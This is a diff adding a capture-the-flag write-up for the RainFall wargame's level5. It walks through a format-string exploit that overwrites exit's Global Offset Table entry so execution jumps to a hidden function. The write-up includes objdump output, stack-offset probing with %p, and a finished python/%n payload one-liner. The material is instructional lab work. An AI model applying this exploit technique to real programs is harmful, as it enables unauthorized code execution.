@@ -1,0 +1,56 @@
+We open the binary in dogbolt. We can see that we have to call the function `o`.
+Here will do the same as previous levels using printf.
+
+First We find will the address where to write.
+Here we see that the `n` function does `return` but instead use a `exit` so it doesn't return in main.
+Here the address to overwrite is the address of the exit function.
+Ok we will do  a GOT overwrite, when a progam is executed it initialized the GOT (Global offset Table) for every external function (lib function),
+it will cache memory address in the GOT so it doesn't have to ask the lib (here libc) for every external function call.
+```Shell
+level5@RainFall:~$ objdump -R level5 
+
+level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+```
+here the address is : 08049838
+in little endian : /x38/x98/x04/x08
+
+
+The address of `o`.
+```Shell
+level5@RainFall:~$ objdump -t level5
+...
+080484a4 g     F .text  0000001e              o
+...
+```
+address : 080484a4
+converted in decimal : 134513828
+
+
+Let's find the offset of the buffer :
+```
+level5@RainFall:~$ ./level5
+AAAA %p %p %p %p %p %p %p %p %p %p
+AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
+```
+Here we find the address of the buffer at %4$p
+
+Let's put this together:
+Here we do not forget to substract 4 bytes for the address
+``` Shell
+python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"' > /tmp/exploit1 && cat /tmp/exploit1 - | ./level5
+```
+
+To go further :
+https://axcheron.github.io/exploit-101-format-strings/
